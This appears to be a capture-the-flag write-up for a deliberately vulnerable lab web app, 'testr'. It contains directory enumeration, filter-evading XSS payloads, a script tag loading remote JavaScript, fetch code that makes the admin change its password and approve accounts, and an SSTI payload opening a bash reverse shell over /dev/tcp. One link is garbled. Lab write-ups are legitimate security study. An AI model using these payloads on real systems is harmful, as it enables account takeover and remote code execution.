## testr

https://github.com/bmdyy/testr

"Our admin will review your portfolio if you chose to include one." This probably indicates to XSS.

The apply request is this, but the XSS is not in website field.
```
name=Dudu&email=dudu%40gmail.com&website=Website%3A+%3Cscript+src%3Dhttp%3A%2F%2F10.10.14.2%2Ftest.js%3E%3C%2Fscript%3E&secret_phrase=SecretPhrase&password=123&password2=123
```

Enumerating directories:
```
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/dirb/big.txt -t 40 -x zip,bkp

/api                  (Status: 200) [Size: 5043]
/apply                (Status: 405) [Size: 153]
/approve              (Status: 405) [Size: 153]
/change_password      (Status: 405) [Size: 153]
/deny                 (Status: 405) [Size: 153]
/editor               (Status: 302) [Size: 197] [--> login]
/login                (Status: 200) [Size: 7192]
/logout               (Status: 302) [Size: 197] [--> login]
/reset
```

`/api` gives some information about the website and is vulnerable to xss on `q` parameter.
```
# Testing XSS
<img src=x o<scriptnerror=javajavascript:script:(function(){alert(1)})()>

# Testing XSS with Base64
<img src=x o<scriptnerror=javajavascript:script:eval(atob('YWxlcnQoMSk='))>
```

'atob' is used to decode base64 based on [these payloads](We can make the admin send `POST /change_secret_phrase` and `POST /change_password` to change its password.
).

We can make the admin send `POST /change_secret_phrase` and `POST /change_password` to change its password.

`change_secret_phase` required body:
```
{phrase, phrase2}
```

`change_password` required body:
```
{phrase, password, password2}
```

This would be the javascript file to do this process:
```js
let h = {'Content-Type':'application/x-www-form-urlencoded'};
	fetch('http://localhost:5000/change_secret_phrase',{
	  method:'POST',
	  headers:h,
	  body:'secret_phrase="test"&secret_phrase2="test"'
	}).then(r=>{
	  fetch('http://localhost:5000/change_password',{
        method:'POST',
	    headers:h,
	    body:'secret_phrase="test&password="senha123"&password2="senha123"'
	  });
	});
```

We can also create a user and make the admin approve our application on rout `POST /approve`
```js
let formData = new FormData();
	formData.append('email','dudu@gmail.com');
	fetch('http://localhost:5000/approve',{
	  method:'POST',
	  body:formData
	});
```

<br>

### SSTI - Command Injection
You can execute code putting the payload below:
```python
"".__class__.__mro__[1].__subclasses__()[425](['id'])

"".__class__.__mro__[1].__subclasses__()[425](['/bin/bash','-c','bash -i >& /dev/tcp/192.168.1.125/9000 0>&1'])
```
